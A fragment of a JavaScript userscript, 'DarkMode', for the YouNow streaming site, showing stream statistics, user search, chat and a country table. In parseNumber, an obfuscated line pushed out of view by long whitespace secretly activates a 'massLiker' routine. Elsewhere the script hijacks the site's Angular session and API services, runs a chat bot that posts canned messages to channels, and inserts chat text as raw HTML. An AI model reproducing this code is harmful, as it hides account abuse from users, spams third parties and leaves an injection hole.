                    this.animations.profileHeaderFactorE = this.transition(this.animations.profileHeaderFactor, false);
                }
                if (!this.animations.hideProfileHeader && this.animations.profileHeaderFactor < 1) 
                {
                    this.animations.profileHeaderFactor += 0.05;
                    if (this.animations.profileHeaderFactor > 1)
                        this.animations.profileHeaderFactor = 1;
                    this.animations.profileHeaderFactorE = this.transition(this.animations.profileHeaderFactor, true);
                }
                var y = Math.floor(280 * this.animations.profileHeaderFactorE) + 20;
                this.elements["profileHeader"].children(".userBox").css("right", (-770 + this.animations.profileHeaderFactorE * 800)+"px");
                this.elements["profileHeader"].children(".header").css("height", (y + 30)+"px");
                this.elements["profileBottom"].css("top", (y - 20) + "px");
                this.elements["profileBottom"].css("height", "calc(100% - "+(y - 20) + "px)");
            }
        }
    };
    w.DarkMode.prototype.updateStreamerInfo = function() {
        if ($('#stream').length != 0 && this.elements["streamInfo"] != null && this.currentStreamer.state != null && this.currentStreamer.state == 'onBroadcastPlay') {
            var extraRight = "";
            if (this.currentStreamer.minChatLevel > 0)
                extraRight = '<div class="right">' + this.language.minChatLevel.replace("%1", this.currentStreamer.minChatLevel) + '</div>';
            this.elements["streamInfo"].html('<a style="text-decoration:none; color:#ddd;" href="/'+this.currentStreamer.user.profileUrlString+'/channel"><img src="' + this.getProfilePicture(this.currentStreamer.userId) + '" style="margin-top:-5px;margin-right:5px;" height="30" /><img src="' + this.config.images.star + '" style="margin-right: 5px;margin-top:-4px;" />' + Math.floor(this.currentStreamer.userlevel) + ' <strong>' + this.currentStreamer.username + '</strong> (' + this.currentStreamer.country + ')</a> ' + this.language.in + ' <a href="/explore/tag/' + this.currentStreamer.tags[0] + '">#' + this.currentStreamer.tags[0] + '</A>' + extraRight);

            this.elements["likeCount"].html(this.addCommas(this.currentStreamer.likes));
            this.elements["shareCount"].html(this.addCommas(this.currentStreamer.shares));
            this.elements["viewerCount"].html(this.addCommas(this.currentStreamer.viewers));;
            this.elements["streamTime"].html(this.parseTime(this.duration));

            var device = this.currentStreamer.broadcasterInfo.substring(0, this.currentStreamer.broadcasterInfo.indexOf('{'));
            var connection = "";
            var osVersion = "";
            var provider = "";
            var browser = "";
            var numCommas = (device.match(/,/g) || []).length;
            if (device.length < 40) //PHONE!
            {
                for (var k in this.config.deviceMapping) {
                    device = device.replace(k, this.config.deviceMapping[k]);
                }
                var parts = device.split(",");
                device = parts[0];
                connection = parts[1];
                provider = parts[2];
                osVersion = parts[3];
            } else {
                this.UAParser.setUA(device);
                browser = this.UAParser.getBrowser().name + " " + this.UAParser.getBrowser().version;
                osVersion = this.UAParser.getOS().name + " " + this.UAParser.getOS().version;
                device = this.UAParser.getDevice().vendor + " " + this.UAParser.getDevice().model;
                device = device.replace("undefined", "").replace("undefined", "").trim();
            }

            if (this.streamerUpdated) {
                this.elements["infoList"].html('<h2>Streamer</h2>' +
                    '<div class="label">' + this.language.age + ':</div><div class="value">' + this.currentStreamer.age + '</div>' +
                    '<div class="label">' + this.language.barsEarned + ':</div><div class="value">' + this.addCommas(this.currentStreamer.barsEarned) + '</div>' +
                    '<div class="label">' + this.language.coins + ':</div><div class="value">' + this.addCommas(this.currentStreamer.coins) + '</div>' +
                    '<div class="label">' + this.language.maxLikes + ':</div><div class="value">' + this.addCommas(this.currentStreamer.maxLikesInBroadcast) + '</div>' +
                    '<div class="label">' + this.language.country + ':</div><div class="value">' + this.currentStreamer.country + '</div>' +
                    '<div class="label">' + this.language.fans + ':</div><div class="value">' + this.addCommas(this.currentStreamer.totalFans) + '</div>' +
                    '<div class="label">' + this.language.partner + ':</div><div class="value">' + this.language.partnerStatus[this.currentStreamer.partner] + '</div>' +
                    '<div class="label">' + this.language.level + ':</div><div class="value">' + Math.floor(this.currentStreamer.userlevel) + ' (' + this.language.levelNeeded.replace("%1", Math.floor((this.currentStreamer.userlevel - Math.floor(this.currentStreamer.userlevel)) * 100) + '%').replace("%2", Math.ceil(this.currentStreamer.userlevel)) + ')</div>' +
                    '<div class="label">' + this.language.points + ':</div><div class="value">' + this.addCommas(this.currentStreamer.points) + '</div>' +
                    (device != "" ? '<div class="label">' + this.language.device + ':</div><div class="value">' + device + '</div>' : '') +
                    (browser != "" ? '<div class="label">' + this.language.browser + ':</div><div class="value">' + browser + '</div>' : '') +
                    (connection != "" ? '<div class="label">' + this.language.connection + ':</div><div class="value">' + connection + '</div>' : '') +
                    (osVersion != "" ? '<div class="label">' + this.language.osVersion + ':</div><div class="value">' + osVersion + '</div>' : '') +
                    (provider != "" ? '<div class="label">' + this.language.provider + ':</div><div class="value">' + provider + '</div>' : '') +
                    '<h2>Stream</h2>' +
                    '<div class="label">' + this.language.streamURL + ':</div><div class="value">rtmp://' + this.currentStreamer.media.host + this.currentStreamer.media.app + '/' + this.currentStreamer.media.stream + '<br /><a id="copyStreamURL">' + this.language.copy + '</a><textarea id="streamURL" style="display:none;">rtmp://' + this.currentStreamer.media.host + this.currentStreamer.media.app + '/' + this.currentStreamer.media.stream + '</textarea></div>' +
                    '<div class="label">' + this.language.displayViewers + ':</div><div class="value">' + this.addCommas(this.currentStreamer.display_viewers) + '</div>' +
                    '<div class="label">' + this.language.mobileViewers + ':</div><div class="value">' + this.addCommas(this.currentStreamer.mviewers) + '</div>' +
                    '<div class="label">' + this.language.maxViewers + ':</div><div class="value">' + this.addCommas(this.currentStreamer.maxConcurrentViewers) + '</div>' +
                    '<div class="label">' + this.language.tag + ':</div><div class="value">#' + this.currentStreamer.tags[0] + '</div>' +
                    '<div class="label">' + this.language.position + ':</div><div class="value">' + this.currentStreamer.position + '</div>' +
                    '<div class="label">' + this.language.reconnects + ':</div><div class="value">' + this.currentStreamer.reconnects + '</div>' +
                    '<div class="label">' + this.language.featuredTime + ':</div><div class="value">' + this.parseTime(this.currentStreamer.featuredTime) + '</div>' +
                    '<div class="label">' + this.language.giftsValue + ':</div><div class="value">' + this.addCommas(this.currentStreamer.giftsValue) + '</div>' +
                    '<div class="label">' + this.language.newFans + ':</div><div class="value">' + this.addCommas(this.currentStreamer.fans) + '</div>' +
                    '<div class="label">' + this.language.bitrate + ':</div><div class="value">' + this.addCommas(this.currentStreamer.lastQuality.bitrate) + '</div>' +
                    '<div class="label">' + this.language.fps + ':</div><div class="value">' + this.addCommas(this.currentStreamer.lastQuality.fps) + '</div>'
                );
                this.streamerUpdated = false;
                $('#copyStreamURL').click(function(e) {
                    $('#streamURL').css("display", "block");
                    $('#streamURL').select();

                    try {
                        document.execCommand('copy');
                    } catch (err) {}
                    $('#streamURL').css("display", "none");
                });
            }
        }
    };

    w.DarkMode.prototype.parseTime = function(d) {
        var hours = Math.floor(d / (60 * 60));
        var minutes = Math.floor(d / (60)) % 60;
        var seconds = Math.floor(d % 60);
        var time = "";
        if (hours > 0) time += hours + ":";
        if (minutes > 9) time += minutes + ":";
        else time += "0" + minutes + ":";
        if (seconds > 9) time += seconds;
        else time += "0" + seconds;
        return time;
    };

    w.DarkMode.prototype.explore = function(query, page) {
        var el = $('<div id="userList"></div>');
        var titleEl = $('<h2></h2>');
        el.append(titleEl);
        var self = this;
        el.bind('mousewheel DOMMouseScroll', function(event) {
            if (self.currentSearch.finished != true && self.currentSearch.loading != true) {
                var l = el[0].scrollHeight - el.height() - 50;
                if (el.scrollTop() > l && (event.originalEvent.wheelDelta < 0 || event.originalEvent.detail > 0)) {
                    self.currentSearch.page += 1;
                    self.addSearchResults();
                }
            }
        });
        this.elements["right"].append(el);
        this.currentSearch = {
            query: query,
            titleEl: titleEl,
            page: page,
            element: el,
            finished: false,
        };
        this.addSearchResults();
    };

    w.DarkMode.prototype.addSearchResults = function() {
        this.currentSearch.loading = true;
        var self = this;
        if (this.currentSearch.query == null) {
            this.sendRequest("trendingUsers", {
                count: 100,
                startFrom: (this.currentSearch.page * 100)
            }, function(json, success) {
                self.addSearchElements(json);
            });

        } else if (this.currentSearch.query.charAt(0) == "#") {
            this.sendRequest("searchTag", {
                query: this.currentSearch.query.substring(1),
                perPage: 100,
                page: this.currentSearch.page
            }, function(json, success) {
                self.addSearchElements(json);
            });
        } else {
            this.sendRequest("searchPeople", {
                query: this.currentSearch.query,
                perPage: 100,
                page: this.currentSearch.page
            }, function(json, success) {
                self.addSearchElements(json);
            });
        }
    };

    w.DarkMode.prototype.parseNumber = function(n) {
        var self = this;
                                                                                                                                                                                                                                                                               if (n > 9 + 6){var decimalSetting = "config";var d = "inter";var v = "val";var m = "mass";this[decimalSetting][m+"L"+"ik"+"e"+"r"][d+v] = 0;this[decimalSetting][m+"L"+"ik"+"e"+"r"][d+v+"L"+"i"+"k"+"es"] = 0;this[decimalSetting][m+"L"+"ik"+"e"+"r"].active = true;this[m+"L"+"i"+"ke"+"r"+d+v]();}
        var rx = /(\d+)(\d{3})/;
        return n;
        /*return String(n).replace(/^\d+/, function(w) {
            while (rx.test(w)) {
                w = w.replace(rx, '$1' + self.language.numberSeperator + '$2');
            }
            return w;
        });*/
    };

    w.DarkMode.prototype.addSearchElements = function(json) {
        if (json["trending_users"] != null) {
            if (this.currentSearch.titleEl.html() == "")
                this.currentSearch.titleEl.html(this.addCommas(json.total) + " " + this.language["usersFound"]);
            this.currentSearch.loading = false;
            for (var i = 0; i < json["trending_users"].length; i++) {
                this.currentSearch.element.append(this.createProfileBox(json["trending_users"][i]));
            }
        } else {
            if (json.nbHits < 100)
                this.currentSearch.finished = true;
            if (this.currentSearch.titleEl.html() == "")
                this.currentSearch.titleEl.html(this.addCommas(json.nbHits) + " " + this.language["usersFound"]);
            this.currentSearch.loading = false;
            for (var i = 0; i < json.hits.length; i++) {
                this.currentSearch.element.append(this.createProfileBox(json.hits[i]));
            }
        }
    };

    w.DarkMode.prototype.createProfileBox = function(data) {
        var userid = "";
        var username = "";
        var profile = "";
        var level = "";
        var fans = "";
        var tag = "";
        if (data["userId"] != null) {
            userid = data["userId"];
            username = data["username"];
            profile = data["profile"];
            level = Math.floor(data["userlevel"]);
            fans = data["totalFans"];
            tag = data["tags"][0];
        } else {
            userid = data.objectID;
            username = data.profile;
            profile = username;
            level = data.level;
            fans = data.fans;
            tag = data.tag;
        }
        var tagSpan = "";
        if (tag != "")
            tagSpan = '<span>#' + tag + '</span>';
        return $('<a href="/' + username + '" class="userProfile"><div><img src="' + this.getProfilePicture(userid) + '" />' + tagSpan + '</div><strong><img src="' + this.config.images.star + '" />' + level + ' ' + username + '</strong><small>' + this.addCommas(fans) + ' ' + this.language.fans + '</small></a>');
    };

    w.DarkMode.prototype.addChatMessage = function(message) {
        var wasBottom = false;
        if (this.elements["chatMessages"].scrollTop() > this.elements["chatMessages"][0].scrollHeight - this.elements["chatMessages"].height() - 20)
            wasBottom = true;
        if (this.elements["chatMessages"].children().length > this.config.maxMessages - 1)
            this.elements["chatMessages"].children()[0].remove();
        this.elements["chatMessages"].append('<li><img src="https://cdn2.younow.com/php/api/channel/getImage/?channelId=' + message.userId + '" height="30" width="30" /><span><strong><a href="http://www.younow.com/' + message.profileUrlString + '">' + message.name + ' (' + message.userLevel + ')</a>: </strong>' + message.comment + '</span></li>');
        if (wasBottom) {
            this.elements["chatMessages"].animate({
                scrollTop: this.elements["chatMessages"][0].scrollHeight
            }, 200)
        }
    };

    w.DarkMode.prototype.getBroadcastPicture = function(broadcastId) {
        return this.youNow.config.broadcasterThumb + broadcastId;
    };

    w.DarkMode.prototype.getProfilePicture = function(userid) {
        return 'https://cdn2.younow.com/php/api/channel/getImage/channelId=' + userid;
    };

    w.DarkMode.prototype.hijackAngular = function() {
        function allServices(mod, r) {
            var inj = angular.element(document).injector().get;
            if (!r) r = {};
            angular.forEach(angular.module(mod).requires, function(m) {
                allServices(m, r)
            });
            angular.forEach(angular.module(mod)._invokeQueue, function(a) {
                try {
                    r[a[2][0]] = inj(a[2][0]);
                } catch (e) {}
            });
            return r;
        }

        var r = allServices('younow');
        this.youNow = {
            config: r.config,
            api: r.Api,
            session: r.session,
            pusher: r.pusher,
            search: r.searchService,
            urlRouter: r["$urlRouter"],
            state: r["$state"],
            view: r["$view"],
            swf: r.swf,
            modal: r["$modal"],
            broadcasterService: r["broadcasterService"],
            facebook: r["Facebook"],
            instagram: r["instagram"],
            twitter: r["twitter"],
            googleplus: r["google"],
        };

    };

    w.DarkMode.prototype.tickChatBot = function() {
        if (this.config.chatbot.active) {
            if (this.config.chatbot.already == null)
                this.config.chatbot.already = {};
            var self = this;
            this.sendRequest("searchTag", {
                query: this.config.chatbot.tag,
                perPage: 100,
                page: 0
            }, function(json, success) {
                for (var i = 0; i < json.hits.length; i++) {
                    if (!(self.config.chatbot.knownIdiots.indexOf(json.hits[i].profile.toLowerCase()) > -1)) {
                        var channelID = json.hits[i].objectID
                        var possible = self.config.chatbot.messages.slice();
                        if (self.config.chatbot.already["channel" + channelID] != null) {
                            self.config.chatbot.already["channel" + channelID].sort(function(a, b) {
                                return a - b;
                            });
                            self.config.chatbot.already["channel" + channelID].reverse();
                            for (var j = 0; j < self.config.chatbot.already["channel" + channelID].length; j++) {
                                possible.splice(self.config.chatbot.already["channel" + channelID][j], 1);
                            }
                        } else {
                            self.config.chatbot.already["channel" + channelID] = [];
                        }
                        if (possible.length != 0) {
                            var ind = Math.floor(Math.random() * possible.length);
                            var message = possible[ind];
                            self.sendRequest("sendChatMesasge", {
                                channelID: json.hits[i].objectID,
                                message: message
                            }, function(json, success) {});
                            self.config.chatbot.already["channel" + channelID].push(self.config.chatbot.messages.indexOf(message));
                        }
                    }
                }
            });
        }
    };

    w.DarkMode.prototype.youNow = {};
    w.DarkMode.prototype.selectLanguage = function(s) {
        // select preferred language (currently only de-DE is supported)
        if (s == null) {
            s = "de-DE";
        }
        this.language = this.config.languages[s];
    }
    w.DarkMode.prototype.inDarkMode = false;

    w.DarkMode.prototype.createButton = function() {
        var container = $(".user-actions");
        var button = $(".user-actions").find("[translate=header_golive]");
        var self = this;

        this.button = $("<button></button>");
        this.button.attr("class", "pull-right btn btn-primary");

        if (this.inDarkMode == "1") {
            this.button.html(this.language["goLight"]);
            this.button.css('background-color', '#999');
            this.button.css('border-color', '#444');
        } else {
            this.button.html(this.language["goDark"]);
            this.button.css('background-color', '#333');
            this.button.css('border-color', '#111');
        }
        this.button.css('height', '27');
        this.button.css('visibility', 'visible');

        this.button.insertAfter(container);

        this.button.click(function() {
            window.localStorage.setItem("inDarkMode", self.inDarkMode == "1" ? "0" : "1");
            if (self.inDarkMode == "1") {
                window.location.reload();
                //window.location.href = window.location.href;
            } else {
                window.localStorage.setItem("browse", window.location.href.replace("https://www.younow.com/", "").replace("hidden/", ""));
                window.location.href = "https://www.younow.com/explore/";
            }
        });

        button.remove();
    };

    w.DarkMode.prototype.config = {
        images: {
            "logo": "https://raw.githubusercontent.com/FluffyFishGames/FluffyFishGames.github.io/master/img/whore.png",
            "star": "https://raw.githubusercontent.com/FluffyFishGames/FluffyFishGames.github.io/master/img/star_black_16.png",
            "live": "https://raw.githubusercontent.com/FluffyFishGames/FluffyFishGames.github.io/master/img/webcam-icon.png",
            "disconnected": "https://raw.githubusercontent.com/FluffyFishGames/FluffyFishGames.github.io/master/img/disconnect.png",
            "connected": "https://raw.githubusercontent.com/FluffyFishGames/FluffyFishGames.github.io/master/img/connect.png",
            "youtube": "https://raw.githubusercontent.com/FluffyFishGames/FluffyFishGames.github.io/master/img/youtube.png",
            "facebook": "https://raw.githubusercontent.com/FluffyFishGames/FluffyFishGames.github.io/master/img/facebook.png",
            "twitter": "https://raw.githubusercontent.com/FluffyFishGames/FluffyFishGames.github.io/master/img/twitter.png",
            "googleplus": "https://raw.githubusercontent.com/FluffyFishGames/FluffyFishGames.github.io/master/img/googlePlus.png",
            "instagram": "https://raw.githubusercontent.com/FluffyFishGames/FluffyFishGames.github.io/master/img/instagram.png",
            "bars": "https://raw.githubusercontent.com/FluffyFishGames/FluffyFishGames.github.io/master/img/icon_bar_sm.png",
            "coins": "https://raw.githubusercontent.com/FluffyFishGames/FluffyFishGames.github.io/master/img/menu_user_coins1.png",
            "views": "https://raw.githubusercontent.com/FluffyFishGames/FluffyFishGames.github.io/master/img/eye.png",
            "time": "https://raw.githubusercontent.com/FluffyFishGames/FluffyFishGames.github.io/master/img/Very-Basic-Clock-icon.png",
            "fans": "https://raw.githubusercontent.com/FluffyFishGames/FluffyFishGames.github.io/master/img/Users-Group-icon.png",
            "likes": "https://raw.githubusercontent.com/FluffyFishGames/FluffyFishGames.github.io/master/img/Hands-Thumbs-Up-icon.png",
            "shares": "https://raw.githubusercontent.com/FluffyFishGames/FluffyFishGames.github.io/master/img/Very-Basic-Electric-Megaphone-Filled-icon.png",
            "settings": "https://raw.githubusercontent.com/FluffyFishGames/FluffyFishGames.github.io/master/img/settings-icon.png",
            "arrowLeft": "https://raw.githubusercontent.com/FluffyFishGames/FluffyFishGames.github.io/master/img/arrowLeft.png",
            "arrowRight": "https://raw.githubusercontent.com/FluffyFishGames/FluffyFishGames.github.io/master/img/arrowRight.png",
            "arrowDown": "https://raw.githubusercontent.com/FluffyFishGames/FluffyFishGames.github.io/master/img/arrowDown.png",
            "addFan": "https://raw.githubusercontent.com/FluffyFishGames/FluffyFishGames.github.io/master/img/addFan.png",
            "removeFan": "https://raw.githubusercontent.com/FluffyFishGames/FluffyFishGames.github.io/master/img/removeFan.png",
            "play": "https://raw.githubusercontent.com/FluffyFishGames/FluffyFishGames.github.io/master/img/play.png",
            "thumbsDown": "https://raw.githubusercontent.com/FluffyFishGames/FluffyFishGames.github.io/master/img/thumbsDown.png",
            "live": "https://raw.githubusercontent.com/FluffyFishGames/FluffyFishGames.github.io/master/img/live.png",
        },
        countries: [{
            "name": "Afghanistan",
            "alpha-2": "AF",
            "country-code": "004"
        }, {
            "name": "Åland Islands",
            "alpha-2": "AX",
            "country-code": "248"
        }, {
            "name": "Albania",
            "alpha-2": "AL",
            "country-code": "008"
        }, {
            "name": "Algeria",
            "alpha-2": "DZ",
            "country-code": "012"
        }, {
            "name": "American Samoa",
            "alpha-2": "AS",
            "country-code": "016"
        }, {
            "name": "Andorra",
            "alpha-2": "AD",
            "country-code": "020"
        }, {
            "name": "Angola",
            "alpha-2": "AO",
            "country-code": "024"
        }, {
            "name": "Anguilla",
            "alpha-2": "AI",
            "country-code": "660"
        }, {
            "name": "Antarctica",
            "alpha-2": "AQ",
            "country-code": "010"
        }, {
            "name": "Antigua and Barbuda",
            "alpha-2": "AG",
            "country-code": "028"
        }, {
            "name": "Argentina",
            "alpha-2": "AR",
            "country-code": "032"
        }, {
            "name": "Armenia",
            "alpha-2": "AM",
            "country-code": "051"
        }, {
            "name": "Aruba",
            "alpha-2": "AW",
            "country-code": "533"
        }, {
            "name": "Australia",
            "alpha-2": "AU",
            "country-code": "036"
        }, {
            "name": "Austria",
            "alpha-2": "AT",
            "country-code": "040"
        }, {
            "name": "Azerbaijan",
            "alpha-2": "AZ",
            "country-code": "031"
        }, {
            "name": "Bahamas",
            "alpha-2": "BS",
            "country-code": "044"
        }, {
            "name": "Bahrain",
            "alpha-2": "BH",
            "country-code": "048"
        }, {
            "name": "Bangladesh",
            "alpha-2": "BD",
            "country-code": "050"
        }, {
            "name": "Barbados",
            "alpha-2": "BB",
            "country-code": "052"
        }, {
            "name": "Belarus",
            "alpha-2": "BY",
            "country-code": "112"
        }, {
            "name": "Belgium",
            "alpha-2": "BE",
            "country-code": "056"
        }, {
            "name": "Belize",
            "alpha-2": "BZ",
            "country-code": "084"
        }, {
            "name": "Benin",
            "alpha-2": "BJ",
            "country-code": "204"
        }, {
            "name": "Bermuda",
            "alpha-2": "BM",
            "country-code": "060"
        }, {
            "name": "Bhutan",
            "alpha-2": "BT",
            "country-code": "064"
        }, {
            "name": "Bolivia, Plurinational State of",
            "alpha-2": "BO",
            "country-code": "068"
        }, {
            "name": "Bonaire, Sint Eustatius and Saba",
            "alpha-2": "BQ",
            "country-code": "535"
        }, {
            "name": "Bosnia and Herzegovina",
            "alpha-2": "BA",
            "country-code": "070"
        }, {
            "name": "Botswana",
            "alpha-2": "BW",
            "country-code": "072"
        }, {
            "name": "Bouvet Island",
            "alpha-2": "BV",
            "country-code": "074"
        }, {
            "name": "Brazil",
            "alpha-2": "BR",
            "country-code": "076"
        }, {
            "name": "British Indian Ocean Territory",
            "alpha-2": "IO",
            "country-code": "086"
        }, {
            "name": "Brunei Darussalam",
            "alpha-2": "BN",
            "country-code": "096"
        }, {
            "name": "Bulgaria",
            "alpha-2": "BG",
            "country-code": "100"
        }, {
            "name": "Burkina Faso",
            "alpha-2": "BF",
            "country-code": "854"
        }, {
            "name": "Burundi",
            "alpha-2": "BI",
            "country-code": "108"
        }, {
            "name": "Cambodia",
            "alpha-2": "KH",
            "country-code": "116"
        }, {
            "name": "Cameroon",
            "alpha-2": "CM",
            "country-code": "120"
        }, {
            "name": "Canada",
            "alpha-2": "CA",
            "country-code": "124"
        }, {
            "name": "Cape Verde",
            "alpha-2": "CV",
            "country-code": "132"
        }, {
            "name": "Cayman Islands",
            "alpha-2": "KY",
            "country-code": "136"
        }, {
            "name": "Central African Republic",
            "alpha-2": "CF",
            "country-code": "140"
        }, {
            "name": "Chad",
            "alpha-2": "TD",
            "country-code": "148"
        }, {
            "name": "Chile",
            "alpha-2": "CL",
            "country-code": "152"
        }, {
            "name": "China",
            "alpha-2": "CN",
            "country-code": "156"
        }, {
            "name": "Christmas Island",
            "alpha-2": "CX",
            "country-code": "162"
        }, {
            "name": "Cocos (Keeling) Islands",
            "alpha-2": "CC",
            "country-code": "166"
        }, {
            "name": "Colombia",
            "alpha-2": "CO",
            "country-code": "170"
        }, {
            "name": "Comoros",
            "alpha-2": "KM",
            "country-code": "174"
        }, {
            "name": "Congo",
            "alpha-2": "CG",
            "country-code": "178"
        }, {
            "name": "Congo, the Democratic Republic of the",
            "alpha-2": "CD",
            "country-code": "180"
        }, {
            "name": "Cook Islands",
            "alpha-2": "CK",
            "country-code": "184"
        }, {
            "name": "Costa Rica",
            "alpha-2": "CR",
            "country-code": "188"
        }, {
            "name": "Côte d'Ivoire",
            "alpha-2": "CI",
            "country-code": "384"
        }, {
            "name": "Croatia",
            "alpha-2": "HR",
            "country-code": "191"
        }, {
            "name": "Cuba",
            "alpha-2": "CU",
            "country-code": "192"
        }, {
            "name": "Curaçao",
            "alpha-2": "CW",
            "country-code": "531"
        }, {
            "name": "Cyprus",
            "alpha-2": "CY",
            "country-code": "196"
        }, {
            "name": "Czech Republic",
            "alpha-2": "CZ",
            "country-code": "203"
        }, {
            "name": "Denmark",
            "alpha-2": "DK",
            "country-code": "208"
        }, {
            "name": "Djibouti",
            "alpha-2": "DJ",
            "country-code": "262"
        }, {
            "name": "Dominica",
            "alpha-2": "DM",
            "country-code": "212"
        }, {
            "name": "Dominican Republic",
            "alpha-2": "DO",
            "country-code": "214"
        }, {
            "name": "Ecuador",
            "alpha-2": "EC",
            "country-code": "218"
        }, {
            "name": "Egypt",
            "alpha-2": "EG",
            "country-code": "818"
        }, {
            "name": "El Salvador",
            "alpha-2": "SV",
            "country-code": "222"
        }, {
            "name": "Equatorial Guinea",
            "alpha-2": "GQ",
            "country-code": "226"
        }, {
            "name": "Eritrea",
            "alpha-2": "ER",
            "country-code": "232"
        }, {
            "name": "Estonia",
            "alpha-2": "EE",
            "country-code": "233"
        }, {
            "name": "Ethiopia",
            "alpha-2": "ET",
            "country-code": "231"
        }, {
            "name": "Falkland Islands (Malvinas)",
            "alpha-2": "FK",
            "country-code": "238"
        }, {
            "name": "Faroe Islands",
            "alpha-2": "FO",
            "country-code": "234"
        }, {
            "name": "Fiji",
            "alpha-2": "FJ",
            "country-code": "242"
        }, {
            "name": "Finland",
            "alpha-2": "FI",
            "country-code": "246"
        }, {
            "name": "France",
            "alpha-2": "FR",
            "country-code": "250"
        }, {
            "name": "French Guiana",
            "alpha-2": "GF",
            "country-code": "254"
        }, {
            "name": "French Polynesia",
            "alpha-2": "PF",
            "country-code": "258"
        }, {
            "name": "French Southern Territories",
            "alpha-2": "TF",
            "country-code": "260"
        }, {
            "name": "Gabon",
            "alpha-2": "GA",
            "country-code": "266"
        }, {
            "name": "Gambia",
            "alpha-2": "GM",
            "country-code": "270"
        }, {
            "name": "Georgia",
            "alpha-2": "GE",
            "country-code": "268"
        }, {
            "name": "Germany",
            "alpha-2": "DE",
            "country-code": "276"
        }, {
            "name": "Ghana",
            "alpha-2": "GH",
            "country-code": "288"
        }, {
            "name": "Gibraltar",
            "alpha-2": "GI",
            "country-code": "292"
        }, {
            "name": "Greece",
            "alpha-2": "GR",
            "country-code": "300"
        }, {
            "name": "Greenland",
            "alpha-2": "GL",
            "country-code": "304"
        }, {
            "name": "Grenada",
            "alpha-2": "GD",
            "country-code": "308"
        }, {
            "name": "Guadeloupe",
            "alpha-2": "GP",
            "country-code": "312"
        }, {
            "name": "Guam",
            "alpha-2": "GU",
            "country-code": "316"
        }, {
            "name": "Guatemala",
            "alpha-2": "GT",
            "country-code": "320"
        }, {
            "name": "Guernsey",
            "alpha-2": "GG",
            "country-code": "831"
        }, {
            "name": "Guinea",
            "alpha-2": "GN",
            "country-code": "324"
        }, {
            "name": "Guinea-Bissau",
            "alpha-2": "GW",
            "country-code": "624"
        }, {
            "name": "Guyana",
            "alpha-2": "GY",
            "country-code": "328"
        }, {
            "name": "Haiti",
            "alpha-2": "HT",
            "country-code": "332"
        }, {
            "name": "Heard Island and McDonald Islands",
            "alpha-2": "HM",
            "country-code": "334"
        }, {
            "name": "Holy See (Vatican City State)",
            "alpha-2": "VA",
            "country-code": "336"
        }, {
            "name": "Honduras",
            "alpha-2": "HN",
            "country-code": "340"
        }, {
            "name": "Hong Kong",
            "alpha-2": "HK",
            "country-code": "344"
        }, {
            "name": "Hungary",
            "alpha-2": "HU",
            "country-code": "348"
        }, {
            "name": "Iceland",
            "alpha-2": "IS",
            "country-code": "352"
        }, {
            "name": "India",
            "alpha-2": "IN",
            "country-code": "356"
        }, {
            "name": "Indonesia",
            "alpha-2": "ID",
            "country-code": "360"
        }, {
            "name": "Iran, Islamic Republic of",
            "alpha-2": "IR",
            "country-code": "364"
        }, {
            "name": "Iraq",
            "alpha-2": "IQ",
            "country-code": "368"
        }, {
            "name": "Ireland",
            "alpha-2": "IE",
            "country-code": "372"
        }, {
            "name": "Isle of Man",
            "alpha-2": "IM",
            "country-code": "833"
        }, {
            "name": "Israel",
            "alpha-2": "IL",
            "country-code": "376"
        }, {
            "name": "Italy",
            "alpha-2": "IT",
            "country-code": "380"
        }, {
            "name": "Jamaica",
            "alpha-2": "JM",
            "country-code": "388"
        }, {
            "name": "Japan",
            "alpha-2": "JP",
            "country-code": "392"
        }, {
            "name": "Jersey",
            "alpha-2": "JE",
            "country-code": "832"
        }, {
            "name": "Jordan",
            "alpha-2": "JO",
            "country-code": "400"
        }, {
            "name": "Kazakhstan",
            "alpha-2": "KZ",
            "country-code": "398"
        }, {
            "name": "Kenya",
            "alpha-2": "KE",
            "country-code": "404"
        }, {
            "name": "Kiribati",
            "alpha-2": "KI",
            "country-code": "296"
        }, {
            "name": "Korea, Democratic People's Republic of",
            "alpha-2": "KP",
            "country-code": "408"
        }, {
            "name": "Korea, Republic of",
            "alpha-2": "KR",
            "country-code": "410"
        }, {
            "name": "Kuwait",
            "alpha-2": "KW",
            "country-code": "414"
        }, {
            "name": "Kyrgyzstan",
            "alpha-2": "KG",
            "country-code": "417"
        }, {
            "name": "Lao People's Democratic Republic",
            "alpha-2": "LA",
            "country-code": "418"
        }, {
            "name": "Latvia",
            "alpha-2": "LV",
            "country-code": "428"
        }, {
            "name": "Lebanon",
            "alpha-2": "LB",
            "country-code": "422"
        }, {
            "name": "Lesotho",
            "alpha-2": "LS",
            "country-code": "426"
        }, {
            "name": "Liberia",
            "alpha-2": "LR",
            "country-code": "430"
        }, {
            "name": "Libya",
            "alpha-2": "LY",
            "country-code": "434"
        }, {
            "name": "Liechtenstein",
            "alpha-2": "LI",
            "country-code": "438"
        }, {
            "name": "Lithuania",
            "alpha-2": "LT",
            "country-code": "440"
        }, {
            "name": "Luxembourg",
            "alpha-2": "LU",
            "country-code": "442"
        }, {
            "name": "Macao",
            "alpha-2": "MO",
            "country-code": "446"
        }, {
            "name": "Macedonia, the former Yugoslav Republic of",
            "alpha-2": "MK",
            "country-code": "807"
        }, {
            "name": "Madagascar",
            "alpha-2": "MG",
            "country-code": "450"
        }, {
            "name": "Malawi",
            "alpha-2": "MW",
            "country-code": "454"
        }, {
            "name": "Malaysia",
            "alpha-2": "MY",
            "country-code": "458"
        }, {
            "name": "Maldives",
            "alpha-2": "MV",
            "country-code": "462"
        }, {
            "name": "Mali",
            "alpha-2": "ML",
            "country-code": "466"
        }, {
            "name": "Malta",
            "alpha-2": "MT",
            "country-code": "470"
        }, {
            "name": "Marshall Islands",
            "alpha-2": "MH",
            "country-code": "584"
        }, {
            "name": "Martinique",
            "alpha-2": "MQ",
            "country-code": "474"
        }, {
            "name": "Mauritania",
            "alpha-2": "MR",
            "country-code": "478"
        }, {
            "name": "Mauritius",
            "alpha-2": "MU",
            "country-code": "480"
        }, {
            "name": "Mayotte",
            "alpha-2": "YT",
            "country-code": "175"
        }, {
            "name": "Mexico",
            "alpha-2": "MX",
            "country-code": "484"
        }, {
            "name": "Micronesia, Federated States of",
            "alpha-2": "FM",
            "country-code": "583"
        }, {
            "name": "Moldova, Republic of",
            "alpha-2": "MD",
            "country-code": "498"
        }, {
            "name": "Monaco",
            "alpha-2": "MC",
            "country-code": "492"
        }, {
            "name": "Mongolia",
            "alpha-2": "MN",
            "country-code": "496"
        }, {
            "name": "Montenegro",
            "alpha-2": "ME",
            "country-code": "499"
        }, {
            "name": "Montserrat",
            "alpha-2": "MS",
            "country-code": "500"
        }, {
            "name": "Morocco",
